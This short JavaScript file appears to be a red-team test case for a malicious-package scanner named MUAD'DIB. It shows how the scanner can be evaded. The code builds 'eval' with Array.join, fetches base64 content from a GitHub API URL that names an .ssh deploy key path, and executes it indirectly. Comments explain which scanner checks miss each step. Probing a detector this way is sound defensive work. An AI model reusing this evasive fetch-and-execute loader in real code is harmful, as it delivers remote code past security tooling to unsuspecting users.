// Bypass 01: Indirect eval via computed property access
// Technique: Array.join to build "eval" string, then call via globalThis[computed]
// Expected: MUAD'DIB scores < 3 (bypass confirmed)

const g = globalThis;

// Array.join is NOT handled by the deobfuscator (only handles String.fromCharCode,
// Buffer.from, atob, and string concat BinaryExpression)
const k = ['e','v','a','l'].join('');

// This URL contains "api.github.com" which is in SAFE_STRINGS
// The SAFE_STRINGS check in ast.js:806-808 returns early before checking SENSITIVE_STRINGS
// So even though the URL also references .ssh paths, no sensitive_string finding is emitted
const configUrl = "https://api.github.com/repos/legit-org/config/contents/.ssh/deploy_key";

const https = require('https');
https.get(configUrl, (res) => {
  let d = '';
  res.on('data', c => d += c);
  res.on('end', () => {
    // Decode the "content" field from GitHub API response (base64-encoded)
    const payload = Buffer.from(JSON.parse(d).content, 'base64').toString();
    // Indirect eval: globalThis['eval'](payload)
    // getCallName() returns '' for computed MemberExpression — never matches 'eval'
    g[k](payload);
  });
});
